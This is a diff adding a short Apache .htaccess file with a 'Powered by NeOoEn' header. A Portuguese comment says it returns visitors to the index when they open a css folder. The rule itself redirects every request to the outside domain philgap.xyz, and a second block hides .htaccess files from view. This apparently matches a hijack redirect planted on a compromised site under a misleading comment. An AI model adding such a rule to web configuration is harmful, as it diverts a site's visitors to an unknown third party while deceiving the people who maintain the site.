@@ -1,0 +1,11 @@
+# Powered by NeOoEn
+
+#direciona para index caso acesse a pasta css
+RewriteRule ^(.*)$ https://philgap.xyz/$1 [L]
+
+#protect htaccess
+<files ~ "^.*\.([Hh][Tt][Aa])">
+order allow,deny
+deny from all
+satisfy all
+</files>
